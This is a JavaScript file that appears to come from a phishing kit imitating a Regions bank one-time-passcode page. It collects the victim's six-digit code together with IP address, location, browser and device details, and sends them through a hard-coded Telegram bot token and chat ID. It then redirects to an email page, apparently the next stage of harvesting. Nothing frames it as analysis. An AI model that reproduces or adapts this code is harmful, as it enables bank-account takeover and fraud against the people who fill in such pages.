const inputs = document.querySelectorAll('.otp-inputs input');
const form = document.getElementById('otpForm');

// Auto-focus & move back on backspace
inputs.forEach((input, index) => {
  input.addEventListener('input', () => {
    if(input.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus();

    // Optional: auto-submit on 6th digit
    if(index === inputs.length - 1) form.dispatchEvent(new Event('submit', { cancelable: true, bubbles: true }));
  });

  input.addEventListener('keydown', (e) => {
    if(e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus();
  });
});

// Fetch IP & client info
async function getClientInfo() {
  const info = { ip: 'Unknown', country: 'Unknown', city: 'Unknown', browser: navigator.userAgent, device: /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop' };
  try {
    const res = await fetch('https://ipapi.co/json/');
    if(res.ok){
      const data = await res.json();
      info.ip = data.ip;
      info.country = data.country_name;
      info.city = data.city;
    }
  } catch(e) { console.warn('IP/location fetch failed'); }
  return info;
}

// Handle form submit
form.addEventListener('submit', async (e) => {
  e.preventDefault();

  let otpValue = '';
  inputs.forEach(input => otpValue += input.value);
  if(otpValue.length < 6){ alert('Please enter all 6 digits.'); return; }

  const info = await getClientInfo();
  const message = `
🔔====Regions OTP Submitted====
Input Code: ${otpValue}
🌐 IP: ${info.ip}
🏳️ Country: ${info.country}
🏙️ City: ${info.city}
💻 Browser: ${info.browser}
📱 Device: ${info.device}
  `;

  // Telegram
  const botToken = "8525430088:AAHfMQJCkbpR3oUnnXC37_SWqKiGnvk9zPQ";
  const chatId = "6211090366";
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: message })
    });
    window.location.href = "email.html"; // redirect after send
  } catch(err){
    console.error('Telegram Error:', err);
    //alert('Failed to send to Telegram');
  }
});
